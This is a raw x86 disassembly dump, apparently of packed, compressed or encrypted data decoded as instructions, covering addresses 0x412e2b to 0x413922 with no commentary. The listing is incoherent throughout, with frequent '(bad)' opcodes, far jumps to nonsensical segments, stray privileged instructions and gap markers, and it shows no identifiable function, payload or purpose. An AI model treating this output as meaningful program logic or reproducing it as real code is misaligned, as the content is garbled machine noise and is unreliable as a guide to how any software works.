  412e2b:	fbstp  TBYTE PTR [ecx]
  412e2d:	lea    eax,[ebx]
  412e2f:	cld    
  412e30:	xor    DWORD PTR [ebp+0x6a31e7fb],ecx
  412e36:	cmp    eax,0x561018d1
  412e3b:	adc    BYTE PTR [ebx+0x20b459fe],0xf8
  412e42:	cmp    DWORD PTR ds:[ecx+0x82],ecx
	...
  412e6d:	add    BYTE PTR [eax],al
  412e6f:	add    BYTE PTR [esi],bh
  412e71:	xor    al,0x2
  412e73:	mov    edi,ebx
  412e75:	pop    edx
  412e76:	pop    ebx
  412e77:	sahf   
  412e78:	imul   edx,eax,0x96c2afa4
  412e7e:	pop    ebx
  412e7f:	xor    edi,DWORD PTR [ebx-0x4cccb06a]
  412e85:	xchg   esi,eax
  412e86:	inc    ebx
  412e87:	xor    esp,DWORD PTR [edi+edx*2+0x332e183e]
  412e8e:	popa   
  412e8f:	xchg   ebp,eax
  412e90:	or     BYTE PTR [ecx+0x6b],al
  412e93:	and    BYTE PTR [esi],al
  412e95:	pop    ebx
  412e96:	pushf  
  412e97:	add    DWORD PTR ds:[edi+0x6b],edx
  412e9b:	lea    edi,[esi+0x5b]
  412e9e:	push   ss
  412e9f:	sahf   
  412ea0:	call   0xce4955e5
  412ea5:	shr    DWORD PTR [eax-0xbf26fd],1
  412eab:	popf   
  412eac:	clc    
  412ead:	push   esi
  412eae:	pop    ebx
  412eaf:	lea    edi,[esi+0x5b]
  412eb2:	out    dx,al
  412eb3:	popf   
  412eb4:	rol    BYTE PTR [eax-0x19],0x17
  412eb8:	mov    dl,0x33
  412eba:	jmp    0x9647:0xaf40b09f
  412ec1:	pop    edx
  412ec2:	out    0x3,eax
  412ec4:	fadd   QWORD PTR ds:[eax+edx*4]
  412ec8:	retf   
  412ec9:	call   0xdf6a:0x720d9ce7
  412ed0:	mov    ecx,0x428d1
	...
  412efd:	add    BYTE PTR [ecx+0x3a80c7c7],al
  412f03:	out    0x6d,eax
  412f05:	inc    ebx
  412f06:	ds inc eax
  412f08:	sbb    al,0xf5
  412f0a:	loope  0x412ec5
  412f0c:	push   ecx
  412f0d:	inc    esp
  412f0e:	ds into 
  412f10:	sub    al,0xac
  412f12:	or     DWORD PTR [eax-0xb],eax
  412f15:	scas   eax,DWORD PTR es:[edi]
  412f16:	push   eax
  412f17:	mov    BYTE PTR [eax],0xe5
  412f1a:	stos   BYTE PTR es:[edi],al
  412f1b:	(bad)  
  412f1c:	or     BYTE PTR [ecx+0x66fe4332],al
  412f22:	add    eax,0x68e9111a
  412f27:	aam    0xec
  412f29:	push   0xfffffff6
  412f2b:	xor    edi,esi
  412f2d:	aam    0x35
  412f2f:	xor    edi,DWORD PTR [edi]
  412f31:	pushf  
  412f32:	mov    edx,0xc0d96b40
  412f37:	xchg   esi,eax
  412f38:	lock cdq 
  412f3a:	stos   BYTE PTR es:[edi],al
  412f3b:	(bad)  
  412f3c:	or     BYTE PTR [ecx+0x6a],al
  412f3f:	lods   eax,DWORD PTR ds:[esi]
  412f40:	std    
  412f41:	es inc edi
  412f43:	sbb    esi,DWORD PTR [ebp+eiz*8+0x4]
  412f47:	sbb    cl,BYTE PTR [ecx]
  412f49:	jmp    0x1ea99a65
  412f4e:	push   ss
  412f4f:	call   0x1151:0x4b817400
  412f56:	sub    BYTE PTR [ebp+edi*8+0x741b36f6],ah
  412f5d:	in     eax,0xf4
  412f5f:	sbb    DWORD PTR [ecx],ecx
  412f61:	jmp    0x412f66
	...
  412f8a:	add    BYTE PTR [eax],al
  412f8c:	adc    BYTE PTR [esi+0x5b3de8ec],0x0
  412f93:	add    BYTE PTR fs:[edi],ch
  412f96:	push   ecx
  412f97:	into   
  412f98:	dec    eax
  412f99:	push   ebx
  412f9a:	call   0xfe818054
  412f9f:	bnd jge 0x412f6d
  412fa2:	push   es
  412fa3:	push   0x28
  412fa5:	das    
  412fa6:	add    DWORD PTR [eax+edi*1],esi
  412fa9:	je     0x412f6b
  412fab:	mov    al,0x7f
  412fad:	push   edi
  412fae:	add    BYTE PTR [ecx],bh
  412fb0:	addr16 adc ch,dl
  412fb3:	in     al,dx
  412fb4:	lods   al,BYTE PTR ds:[esi]
  412fb5:	aaa    
  412fb6:	jb     0x412fa0
  412fb8:	cld    
  412fb9:	push   ebx
  412fba:	rol    BYTE PTR [eax],0x5a
  412fbd:	out    0x55,al
  412fbf:	cmp    DWORD PTR [edi+0xf05735c],0x5c
  412fc6:	add    BYTE PTR [ecx],al
  412fc8:	push   edi
  412fc9:	(bad)  
  412fcb:	add    DWORD PTR [ebx],ebx
  412fcd:	pop    ecx
  412fce:	sub    eax,eax
  412fd0:	outs   dx,BYTE PTR ds:[esi]
  412fd1:	sbb    al,0x6
  412fd3:	add    BYTE PTR [esi+edx*8-0x31e8be75],dh
  412fda:	inc    esp
  412fdb:	in     al,dx
  412fdc:	mov    bh,0xdf
  412fde:	je     0x412fe8
  412fe0:	outs   dx,DWORD PTR ds:[esi]
  412fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe2:	push   esp
  412fe3:	call   DWORD PTR [eax-0x25]
  412fe6:	cmc    
  412fe7:	add    ebx,ecx
  412fe9:	push   ebp
  412fea:	cmp    eax,0x830665e5
	...
  413018:	add    BYTE PTR [eax],al
  41301a:	shr    dh,cl
  41301c:	std    
  41301d:	je     0x412ff8
  41301f:	xor    edi,DWORD PTR [esi+0x5215c9]
  413025:	lea    ebp,[edx+0x4aff4dee]
  41302b:	push   edx
  41302c:	call   0xff20dac3
  413031:	or     edi,0x5c
  413034:	je     0x41303b
  413036:	and    al,0xdf
  413038:	push   DWORD PTR [ecx+ebx*4-0x2b]
  41303c:	jl     0x41302a
  41303e:	xchg   edi,eax
  41303f:	imul   eax,DWORD PTR [esi],0x2b
  413042:	xlat   BYTE PTR ds:[ebx]
  413043:	adc    al,al
  413045:	or     BYTE PTR [edi+0x37ec44d3],ah
  41304b:	loop   0x4130c1
  41304d:	or     BYTE PTR [edi+0x67],bh
  413050:	push   ebx
  413051:	call   eax
  413053:	dec    esi
  413054:	shl    BYTE PTR [ebp+0x69],0xd5
  413058:	jl     0x413046
  41305a:	imul   eax,DWORD PTR ds:0x3e2b,0xfffffff4
  413060:	retf   
  413061:	shl    DWORD PTR [esi],0x34
  413064:	mov    DWORD PTR [edx+ebp*2+0x64],eax
  413068:	cdq    
  413069:	je     0x4130b1
  41306b:	in     al,dx
  41306c:	xor    BYTE PTR [ebp+0x49],dl
  41306f:	lds    eax,FWORD PTR [ebp+0x46fef7]
  413075:	cmp    DWORD PTR [ebx+0x387504a8],0x69
  41307c:	(bad)  
  41307d:	enter  0x0,0x0
	...
  4130a5:	add    BYTE PTR [eax],al
  4130a7:	add    ah,bh
  4130a9:	cmp    eax,DWORD PTR [edx]
  4130ab:	lea    edi,[ebx-0x80]
  4130ae:	xor    al,0xff
  4130b0:	xchg   ebx,eax
  4130b1:	dec    esp
  4130b2:	stos   BYTE PTR es:[edi],al
  4130b3:	imul   edi,DWORD PTR ss:[ebp-0x67],0xffffff82
  4130b8:	push   es
  4130b9:	push   esp
  4130ba:	clts   
  4130bc:	mov    ebp,0x72ffa5ee
  4130c1:	cs out dx,eax
  4130c3:	mov    edi,0xc7207
  4130c8:	mov    ebx,0xe14fa5ee
  4130cd:	out    0x9,al
  4130cf:	call   0xfedc1008
  4130d4:	mov    ebp,0x4074e45b
  4130d9:	mov    cl,0x17
  4130db:	in     al,dx
  4130dc:	ds (bad) 
  4130de:	jmp    FWORD PTR [edx]
  4130e0:	jle    0x4130ec
  4130e2:	les    eax,FWORD PTR [edi]
  4130e4:	ds scas eax,DWORD PTR es:[edi]
  4130e6:	inc    eax
  4130e7:	in     al,dx
  4130e8:	push   cs
  4130e9:	call   0x25aa:0x3c2bfee4
  4130f0:	repz adc al,0x9b
  4130f3:	mov    ebx,?
  4130f5:	rdmsr  
  4130f7:	call   DWORD PTR [ebx]
  4130f9:	cmp    al,0xaa
  4130fb:	xchg   ebp,eax
  4130fc:	jmp    0xe85a:0x76829aec
  413103:	adc    eax,0x69fda45
  413108:	icebp  
  413109:	push   esp
  41310a:	push   0x18
	...
  413134:	add    BYTE PTR [eax],al
  413136:	push   edx
  413137:	pop    edx
  413138:	adc    al,0x2
  41313a:	and    eax,0x39c5b11b
  41313f:	pop    ebx
  413140:	dec    edx
  413141:	mov    edi,DWORD PTR [ebx-0x5771865]
  413147:	sbb    BYTE PTR cs:[esi],ch
  41314a:	data16 cmp al,0xdd
  41314d:	or     esp,DWORD PTR [esi]
  41314f:	dec    ebx
  413150:	mov    ah,0x9a
  413152:	sub    BYTE PTR [ebp+ebx*1+0x5c5b6158],dh
  413159:	inc    eax
  41315a:	sub    ch,BYTE PTR [ecx+edx*8-0x1438eefc]
  413161:	call   0x3d08:0x273f5392
  413168:	das    
  413169:	int3   
  41316a:	call   DWORD PTR [ebx-0x19]
  41316d:	xor    ch,al
  41316f:	das    
  413170:	imul   edi,DWORD PTR [edi-0x6853311b],0x71
  413177:	xor    edx,DWORD PTR [eax]
  413179:	xor    ebx,ecx
  41317b:	cmp    al,0x7
  41317d:	adc    dl,dl
  41317f:	cmp    al,0x75
  413181:	pop    es
  413182:	(bad)  
  413183:	das    
  413184:	call   0x490f:0x2750c09a
  41318b:	cmp    al,0x5d
  41318d:	or     al,0xb1
  41318f:	(bad)  
  413190:	fld    TBYTE PTR [esp+eiz*2+0x3499d73d]
  413197:	sbb    edx,DWORD PTR [ebp+0x4]
	...
  4131c2:	add    BYTE PTR [eax],al
  4131c4:	cdq    
  4131c5:	mov    bl,0xac
  4131c8:	mov    gs,WORD PTR [ebx+0x197699be]
  4131ce:	add    ebp,esp
  4131d0:	cmp    eax,0xd7bd89a6
  4131d5:	(bad)  
  4131d6:	or     al,0x91
  4131d8:	adc    ebx,DWORD PTR [edi+0x1b3b9efd]
  4131de:	jne    0x4131aa
  4131e0:	mov    bh,0x10
  4131e3:	cmp    DWORD PTR [edx-0x4879a46d],ebp
  4131e9:	mov    WORD PTR [eax-0x80],gs
  4131ec:	in     al,0x7b
  4131ee:	add    BYTE PTR [esi+0x31],dh
  4131f1:	arpl   bp,di
  4131f3:	hlt    
  4131f4:	sub    DWORD PTR [ebp+edi*8-0x76ccba24],ecx
  4131fb:	imul   eax,edi,0x6515e93c
  413201:	cmp    al,0xfe
  413203:	and    BYTE PTR [eax],al
  413205:	push   0x2fc29c00
  41320a:	imul   ebp,ecx,0xc1bf2c3d
  413210:	bound  edi,QWORD PTR [eax-0x392916c1]
  413216:	or     al,0x93
  413218:	repz cmp al,0x74
  41321b:	icebp  
  41321c:	xchg   ebp,eax
  41321d:	jmp    0x41321c
  41321f:	push   ss
  413220:	(bad)  
  413221:	mov    bl,0x0
  413223:	jmp    0x2daa2fce
	...
  413250:	add    BYTE PTR [eax],al
  413252:	push   ds
  413253:	call   0xd36a:0x4f38fe00
  41325a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41325b:	(bad)  
  41325c:	or     BYTE PTR [ecx],al
  41325e:	xor    eax,0x65e6fe3d
  413263:	pop    ebx
  413264:	add    dh,cl
  413266:	pop    es
  413267:	mov    ah,0xb9
  413269:	dec    ebp
  41326a:	std    
  41326b:	pop    edx
  41326c:	std    
  41326d:	push   esp
  41326e:	inc    esi
  41326f:	mov    cl,0x1c
  413271:	add    BYTE PTR [eax+0x4c],bh
  413274:	or     al,ch
  413276:	adc    eax,0xfffffee3
  41327b:	push   esi
  41327c:	add    bh,ch
  41327e:	jmp    0x26a5f6f2
  413283:	push   edi
  413284:	std    
  413285:	jne    0x4132e2
  413287:	ins    DWORD PTR es:[edi],dx
  413288:	sbb    al,0xff
  41328a:	inc    edx
  41328b:	dec    edi
  41328c:	call   0xff23fafc
  413291:	push   0xbeed5767
  413296:	das    
  413297:	sahf   
  413298:	popa   
  413299:	inc    ecx
  41329a:	push   edi
  41329b:	loop   0x413311
  41329d:	or     al,0x3d
  41329f:	inc    eax
  4132a0:	push   DWORD PTR [ebp+0x2f]
  4132a3:	pop    es
  4132a4:	push   edx
  4132a5:	dec    DWORD PTR [eax+0x170065d3]
  4132ab:	add    al,0xbc
  4132ad:	push   0x3f5a63
  4132b2:	js     0x41331d
  4132b4:	or     al,0x6a
	...
  4132de:	add    BYTE PTR [eax],al
  4132e0:	xor    al,0xd4
  4132e2:	je     0x4132ec
  4132e4:	jg     0x4132f7
  4132e6:	(bad)  
  4132e7:	jmp    FWORD PTR [eax]
  4132e9:	and    eax,0x89e708c0
  4132ee:	mov    esp,ebp
  4132f0:	push   esp
  4132f1:	cli    
  4132f2:	stc    
  4132f3:	push   0xffffffd7
  4132f5:	mov    BYTE PTR [edx],dh
  4132f7:	push   DWORD PTR [edx-0x4d32179a]
  4132fd:	sar    esi,cl
  4132ff:	mov    DWORD PTR [edx-0x4da39a2e],esp
  413305:	popf   
  413306:	add    bh,bh
  413308:	xor    ah,BYTE PTR [esi-0x18]
  41330b:	dec    ebp
  41330c:	cwde   
  41330d:	sar    dh,cl
  41330f:	call   DWORD PTR [edx]
  413311:	sar    esi,cl
  413313:	jne    0x413353
  413315:	cmp    al,0xaa
  413317:	div    ebx
  413319:	sub    BYTE PTR [esi+0x2487cc8],dl
  41331f:	push   ebp
  413320:	mov    ch,0x28
  413322:	add    bl,0x82
  413325:	sahf   
  413326:	add    al,0x6a
  413328:	sub    eax,0x66081009
  41332d:	loopne 0x41335e
  41332f:	jmp    FWORD PTR [ecx-0x55]
  413332:	aas    
  413333:	cld    
  413334:	(bad)  
  413335:	pop    esp
  413336:	pop    ds
  413337:	inc    ecx
  413338:	ds jmp 0x40a73b4d
  41333e:	xchg   edi,eax
  41333f:	dec    BYTE PTR [ecx-0x47]
  413342:	paddb  mm0,QWORD PTR [eax]
	...
  41336d:	add    BYTE PTR [ecx+0x37],al
  413370:	or     ch,al
  413372:	add    DWORD PTR [edi-0x6b],ecx
  413375:	inc    BYTE PTR [edi]
  413377:	xchg   BYTE PTR [eax],al
  413379:	add    BYTE PTR [ebx-0x57d5753],dl
  41337f:	mov    ebp,DWORD PTR [edx]
  413381:	add    BYTE PTR [eax+edx*2-0x73b98b6b],ah
  413388:	sub    DWORD PTR [ebp+0x9],edx
  41338b:	jns    0x413318
  41338d:	inc    esp
  41338e:	add    bl,BYTE PTR [ecx+edx*1]
  413391:	gs jg  0x4133d8
  413394:	xchg   edi,eax
  413395:	je     0x4133dd
  413397:	dec    esp
  413398:	test   eax,0x2a58e9fd
  41339d:	add    BYTE PTR [esi-0x49],dl
  4133a0:	pop    ds
  4133a1:	inc    ecx
  4133a2:	fadd   QWORD PTR ds:[esp+eiz*2+0x3497447f]
  4133aa:	std    
  4133ab:	jmp    0x4133f1
  4133ad:	add    dh,dl
  4133af:	daa    
  4133b0:	cmp    edi,edi
  4133b2:	mov    ecx,0x7173c23c
  4133b7:	pop    ebx
  4133b8:	jo     0x4133fa
  4133ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133bb:	ret    0x55e0
  4133be:	popa   
  4133bf:	pop    ebx
  4133c0:	aas    
  4133c1:	add    al,0x3e
  4133c3:	dec    edx
  4133c4:	mov    gs,WORD PTR [ebx]
  4133c6:	aad    0xbe
  4133c8:	sub    BYTE PTR [ecx+ecx*4],al
  4133cb:	scas   eax,DWORD PTR es:[edi]
  4133cc:	mov    edi,0xbf630a96
  4133d1:	rol    DWORD PTR [eax],1
	...
  4133fb:	add    al,bh
  4133fd:	cmp    DWORD PTR [edi+0x27f8772b],ebp
  413403:	add    al,0xd6
  413405:	pop    edx
  413406:	out    0xa6,eax
  413408:	mov    ds:0xff1fabc2,eax
  41340d:	pop    edx
  41340e:	mov    ss,WORD PTR [eax]
  413410:	push   esi
  413411:	cmp    ebp,edi
  413413:	or     edx,DWORD PTR [esi+0x52]
  413416:	(bad)  
  413417:	xchg   esi,eax
  413418:	inc    eax
  413419:	cmp    ebp,edi
  41341b:	fwait
  41341c:	and    DWORD PTR [ebx],esp
  41341e:	pop    ss
  41341f:	xchg   edi,eax
  413420:	xor    BYTE PTR [ecx],bh
  413422:	fst    QWORD PTR [edi-0x541050d8]
  413428:	mov    ss,WORD PTR gs:[esi-0x6a]
  41342c:	push   es
  41342d:	push   ds
  41342e:	in     al,0x3
  413430:	imul   esp,esp,0x53
  413433:	cmp    ch,0x37
  413436:	rol    BYTE PTR [ebx],cl
  413438:	xchg   esp,eax
  413439:	outs   dx,BYTE PTR ds:[esi]
  41343a:	adc    BYTE PTR ss:[esi+0x43],al
  41343e:	dec    eax
  41343f:	das    
  413440:	icebp  
  413441:	cmp    BYTE PTR [ecx+0x40],dh
  413444:	jmp    0x165b:0x7f2048c3
  41344b:	adc    BYTE PTR [esi+0x43],al
  41344e:	mov    BYTE PTR [ebp+0x100738d0],dl
  413454:	retf   0x7538
  413457:	or     edx,esi
  413459:	add    BYTE PTR fs:[eax+edx*8+0x2bc839],bl
	...
  413489:	add    BYTE PTR [ecx-0x298daac8],dh
  41348f:	ffree  st(4)
  413491:	fst    QWORD PTR [ebx+ebx*2+0x6a]
  413495:	pop    ds
  413496:	mov    bl,0xaf
  413498:	or     cl,al
  41349a:	sbb    ecx,DWORD PTR [ebp+edi*8-0x3604a3a]
  4134a1:	push   ecx
  4134a2:	adc    al,0xbf
  4134a4:	aas    
  4134a5:	jmp    0xc149e47c
  4134aa:	pop    ebx
  4134ab:	ss (bad) 
  4134ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134ae:	shr    DWORD PTR [edi+0x63319efc],cl
  4134b4:	call   0xfe79436c
  4134b9:	mov    al,ds:0x1c005c7c
  4134be:	mov    bh,0x44
  4134c0:	and    BYTE PTR [ebp+0x300c2a6],0xb
  4134c7:	cmp    DWORD PTR [ecx+eiz*8-0x1b],esi
  4134cb:	mov    ch,0x54
  4134cd:	shl    dx,cl
  4134d0:	inc    ebx
  4134d1:	pop    ebp
  4134d2:	push   edx
  4134d3:	out    dx,eax
  4134d4:	arpl   WORD PTR [eax-0x1e8bc7c3],bp
  4134da:	in     eax,0x35
  4134dc:	cld    
  4134dd:	inc    esi
  4134de:	mov    bl,0x38
  4134e0:	je     0x41351f
  4134e2:	stos   DWORD PTR es:[edi],eax
  4134e3:	scas   al,BYTE PTR es:[edi]
  4134e4:	or     BYTE PTR [ecx+0x65],al
  4134e7:	mov    ebp,?
  4134e9:	cs add eax,0xe9051a
	...
  413517:	add    BYTE PTR [eax],bl
  413519:	in     al,0xec
  41351b:	push   0xfffffffe
  41351d:	xor    ebp,DWORD PTR [ebx-0x17]
  413520:	daa    
  413521:	jae    0x413520
  413523:	xchg   esp,eax
  413524:	inc    ebp
  413525:	inc    ebx
  413526:	dec    esp
  413527:	add    BYTE PTR [ebx-0x65760132],ch
  41352d:	iret   
  41352e:	gs mov esp,0xff009cca
  413534:	sub    ah,BYTE PTR [eax+ebp*8-0x33]
  413538:	mov    ds:0xafffece,al
  41353d:	sar    esi,cl
  41353f:	jne    0x4134e0
  413541:	add    esi,DWORD PTR [esi+0x54]
  413544:	or     dh,0xc8
  413547:	ret    0x5b9b
  41354a:	push   ebx
  41354b:	mov    esi,DWORD PTR [ebx-0x32]
  41354e:	je     0x41355c
  413550:	jg     0x4134ec
  413552:	pop    ecx
  413553:	jmp    DWORD PTR [eax+0x4274c062]
  413559:	xchg   ebp,ecx
  41355b:	gs push ss
  41355d:	pop    edi
  41355e:	push   eax
  41355f:	call   0x3ea704
  413564:	pop    ss
  413565:	into   
  413566:	je     0x413578
  413568:	daa    
  413569:	into   
  41356a:	je     0x413574
  41356c:	scas   eax,DWORD PTR es:[edi]
  41356d:	inc    ecx
  41356e:	xlat   BYTE PTR ds:[ebx]
  41356f:	push   DWORD PTR [eax-0x5fa937fe]
  413575:	iret   
  413576:	enter  0x33c2,0x5b
  41357a:	push   ebx
  41357b:	mov    eax,DWORD PTR [eax]
	...
  4135a5:	add    BYTE PTR [ebx-0x25],dh
  4135a8:	sar    eax,0xd8
  4135ab:	test   BYTE PTR [eax],al
  4135ad:	push   0x2e
  4135af:	shl    BYTE PTR [eax+ecx*1+0x6f],1
  4135b3:	add    edx,DWORD PTR [ebx-0x1]
  4135b6:	inc    eax
  4135b7:	loope  0x4135fd
  4135b9:	cld    
  4135ba:	pop    esp
  4135bb:	or     eax,0x5aa64847
  4135c0:	cmp    BYTE PTR [edi],0xd7
  4135c3:	data16 jl 0x41362e
  4135c6:	sbb    DWORD PTR [ebp+0x3f],edx
  4135c9:	add    BYTE PTR [esi],bh
  4135cb:	cmc    
  4135cc:	test   eax,0x2447d0d
  4135d1:	or     edi,esi
  4135d3:	mov    eax,0xe2d65734
  4135d8:	and    edi,edi
  4135da:	mov    ecx,0xb73c239
  4135df:	mov    ebx,0x97a9f83e
  4135e4:	mov    WORD PTR [ecx+0x44],gs
  4135e7:	adc    eax,0xc6a60818
  4135ec:	xchg   ecx,eax
  4135ed:	(bad)  
  4135ee:	xchg   ecx,eax
  4135ef:	and    eax,0x4014f818
  4135f4:	xchg   ebx,eax
  4135f5:	je     0x41362d
  4135f7:	or     al,0xc
  4135f9:	(bad)  
  4135fa:	jns    0x4135e9
  4135fc:	xchg   ecx,eax
  4135fd:	je     0x413675
  4135ff:	call   0x6b9a:0x2bf3fee5
  413606:	popa   
  413607:	aad    0x91
  413609:	add    BYTE PTR [bx+si],al
	...
  413634:	ja     0x41369d
  413636:	inc    ebx
  413637:	add    BYTE PTR [ecx+0x4f],dl
  41363a:	mov    edi,fs
  41363c:	push   edx
  41363d:	jnp    0x4135d0
  41363f:	(bad)  
  413640:	xor    eax,0x8e121904
  413645:	lods   eax,DWORD PTR ds:[esi]
  413646:	pop    ss
  413647:	clc    
  413648:	mov    es,ebp
  41364a:	pop    ss
  41364b:	or     BYTE PTR [esi],dl
  41364d:	fnstsw WORD PTR [edx-0x2e73de02]
  413653:	push   ebp
  413654:	sbb    DWORD PTR [ebp-0x63e98b6f],ecx
  41365a:	fst    DWORD PTR [ebp+0x9]
  41365d:	popf   
  41365e:	nop
  41365f:	xor    bh,dh
  413661:	ficom  DWORD PTR [ecx-0x69930602]
  413667:	lods   eax,DWORD PTR ds:[esi]
  413668:	ss cmp eax,0x5ae98419
  41366e:	pushf  
  41366f:	(bad)  
  413670:	loopne 0x413621
  413672:	out    dx,eax
  413673:	fwait
  413674:	mov    ch,0x89
  413676:	push   ss
  413677:	xchg   ebx,eax
  413678:	jo     0x41369e
  41367a:	sub    cl,BYTE PTR [eax]
  41367c:	ds nop
  41367e:	jb     0x413620
  413680:	shr    BYTE PTR [edi-0x6edc6415],0xf6
  413687:	xchg   edx,eax
  413688:	inc    esp
  413689:	sbb    esi,DWORD PTR [eax+esi*8+0x21]
  41368d:	inc    ebx
  41368e:	dec    ebp
  41368f:	inc    ebp
  413690:	ds mov ecx,edi
  413693:	xchg   ebp,eax
  413694:	div    BYTE PTR ds:0x33d7
	...
  4136c2:	xchg   ecx,eax
  4136c3:	scas   eax,DWORD PTR es:[edi]
  4136c4:	div    DWORD PTR [ebx]
  4136c6:	mov    DWORD PTR [edi+0xcf29bef],ebp
  4136cc:	mov    edi,0x1d476192
  4136d1:	xchg   ebx,eax
  4136d2:	jo     0x4136f7
  4136d4:	stos   BYTE PTR es:[edi],al
  4136d5:	jmp    FWORD PTR [ecx-0x72]
  4136d8:	jb     0x413679
  4136da:	mov    esp,0xe43aa01e
  4136df:	pop    edx
  4136e0:	add    esi,ecx
  4136e2:	push   eax
  4136e3:	scas   eax,DWORD PTR es:[edi]
  4136e4:	fistp  WORD PTR [ebx-0x6d7975c5]
  4136ea:	mov    dh,0x9f
  4136ec:	jnp    0x41376c
  4136ee:	jp     0x41368c
  4136f0:	pop    ds
  4136f1:	inc    ebp
  4136f2:	fld    TBYTE PTR ds:[esi-0x306d4dfd]
  4136f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136fa:	call   0xa96b:0x263ae79a
  413701:	add    edi,DWORD PTR [esi]
  413703:	pusha  
  413704:	daa    
  413705:	pop    ss
  413706:	dec    edx
  413707:	mov    WORD PTR [edi-0x78],cs
  41370a:	pusha  
  41370b:	xor    al,0x3f
  41370d:	(bad)  
  41370e:	mov    ecx,0x72fb00af
  413713:	lahf   
  413714:	clc    
  413715:	cs inc esi
  413717:	xor    ebp,DWORD PTR [ebx+0x3]
  41371a:	int    0xaf
  41371c:	or     BYTE PTR [ecx],dl
  41371e:	(bad)  
  41371f:	xor    eax,0xafac16fe
  413724:	clc    
  413725:	add    DWORD PTR [eax],0x0
	...
  413750:	fnstenv ds:0xb3a5f174
  413756:	std    
  413757:	dec    bh
  413759:	xor    eax,0x7852f174
  41375e:	std    
  41375f:	je     0x413706
  413761:	cmp    al,0x6d
  413763:	out    0xcf,al
  413765:	xor    eax,0x3cca54fe
  41376a:	jl     0x4137a8
  41376c:	scas   eax,DWORD PTR es:[edi]
  41376d:	xor    eax,0xf3821afd
  413772:	std    
  413773:	(bad)  
  413774:	scas   eax,DWORD PTR es:[edi]
  413775:	xor    eax,0x5d8a8ff3
  41377a:	jae    0x41370a
  41377c:	iret   
  41377d:	scas   eax,DWORD PTR es:[edi]
  41377e:	cld    
  41377f:	scas   al,BYTE PTR es:[edi]
  413780:	push   ecx
  413781:	arpl   ax,bp
  413783:	mov    ebp,DWORD PTR [eax]
  413785:	xor    al,0xfe
  413787:	ds xchg ebp,eax
  413789:	sbb    al,BYTE PTR ds:0xece008e9
  41378f:	push   0x76
  413791:	xor    BYTE PTR [esi+0x13],dl
  413794:	cmp    al,cl
  413796:	cmp    DWORD PTR [esi+0x51],edi
  413799:	arpl   ax,bp
  41379b:	ins    DWORD PTR es:[edi],dx
  41379c:	push   0x8160fe34
  4137a1:	aaa    
  4137a2:	mov    ah,BYTE PTR [edi+esi*2]
  4137a5:	mov    ds:0x74bde93f,eax
  4137aa:	add    ch,bl
  4137ac:	jge    0x413771
  4137ae:	icebp  
  4137af:	les    edi,FWORD PTR [ebx+ebx*2+0x55]
	...
  4137db:	add    BYTE PTR [eax],al
  4137dd:	add    BYTE PTR [edi-0x3e],ch
  4137e0:	inc    eax
  4137e1:	add    bh,ah
  4137e3:	ss mov esi,0xe8724474
  4137e9:	sti    
  4137ea:	mov    ecx,0x170bfeca
  4137ef:	push   ebx
  4137f0:	pop    ss
  4137f1:	push   eax
  4137f2:	scas   eax,DWORD PTR es:[edi]
  4137f3:	push   edi
  4137f4:	add    bh,ch
  4137f6:	imul   edx,DWORD PTR [edi-0x5],0x50579665
  4137fd:	inc    DWORD PTR [edx+0x30]
  413800:	out    0x3,al
  413802:	cmp    ebx,ecx
  413804:	(bad)  
  413805:	call   0x3ea4a5
  41380a:	fwait
  41380b:	push   cs
  41380c:	mov    esi,0xfeca98b9
  413811:	push   DWORD PTR [ebp-0x47]
  413814:	xor    eax,0xff1ef207
  413819:	jne    0x413896
  41381b:	retf   0x874
  41381e:	outs   dx,DWORD PTR ds:[esi]
  41381f:	dec    eax
  413820:	push   edx
  413821:	(bad)  
  413822:	mov    eax,0x63c2c76a
  413827:	push   edi
  413828:	push   ebx
  413829:	mov    ebp,DWORD PTR [ebx-0x2b173e22]
  41382f:	and    al,0x55
  413831:	dec    ebx
  413832:	es pop edi
  413834:	add    BYTE PTR [ebp+0x63],dh
  413837:	lock mov edi,0x55570c
  41383d:	push   0x57
  41383f:	push   ebp
  413840:	std    
  413841:	inc    DWORD PTR [eax]
	...
  41386b:	add    BYTE PTR [edx],dh
  41386d:	xor    ebp,DWORD PTR [eax+0x0]
  413870:	cmp    eax,0x5795e857
  413875:	push   edi
  413876:	add    BYTE PTR [ecx+0x75fee6d2],cl
  41387c:	lahf   
  41387d:	(bad)  
  41387e:	aam    0x54
  413880:	mov    DWORD PTR ds:[eax-0x6f5f7c78],edx
  413887:	je     0x41388f
  413889:	call   0x7490:0x7164fc16
  413890:	inc    edx
  413891:	push   ds
  413892:	add    ch,BYTE PTR [edx+0x3e]
  413895:	pushf  
  413896:	adc    al,0x40
  413898:	ds inc esp
  41389a:	jg     0x4138e0
  41389c:	shl    ah,cl
  41389e:	sbb    eax,DWORD PTR [eax]
  4138a0:	fs inc esp
  4138a2:	sbb    al,0x12
  4138a4:	push   esp
  4138a5:	inc    esp
  4138a6:	xchg   ecx,eax
  4138a7:	je     0x41386b
  4138a9:	pop    ecx
  4138aa:	not    BYTE PTR [ebp+eax*1+0x3]
  4138ae:	add    al,BYTE PTR [ebp-0x7885c682]
  4138b4:	ds inc esp
  4138b6:	add    cl,BYTE PTR [ebx+0x117a100b]
  4138bc:	retf   
  4138bd:	ja     0x413853
  4138bf:	dec    edi
  4138c0:	and    al,0x44
  4138c2:	sbb    BYTE PTR [edx],dl
  4138c4:	adc    al,0x44
  4138c6:	sbb    ah,BYTE PTR [edx]
  4138c8:	sbb    BYTE PTR [ebx-0x180c00fc],al
  4138ce:	lea    edx,[ecx+0x0]
	...
  4138f9:	add    BYTE PTR [esi-0x41],cl
  4138fc:	les    esi,FWORD PTR [edi+0x9]
  4138ff:	add    DWORD PTR [eax],ebx
  413901:	lock push esi
  413903:	test   BYTE PTR [eax-0x1],al
  413906:	pop    ecx
  413907:	stos   DWORD PTR es:[edi],eax
  413908:	inc    edi
  413909:	call   0x485a3d53
  41390e:	dec    ecx
  41390f:	inc    edi
  413910:	pushf  
  413911:	out    0xd2,eax
  413913:	dec    edi
  413914:	(bad)  
  413915:	inc    bh
  413917:	jbe    0x4138b9
  413919:	(bad)  
  41391a:	stos   DWORD PTR es:[edi],eax
  41391b:	mov    ah,0x9c
  41391d:	push   edx
  41391e:	js     0x4138e1
  413920:	(bad)  
  413921:	(bad)  
  413922:	stos   DWORD PTR es:[edi],eax
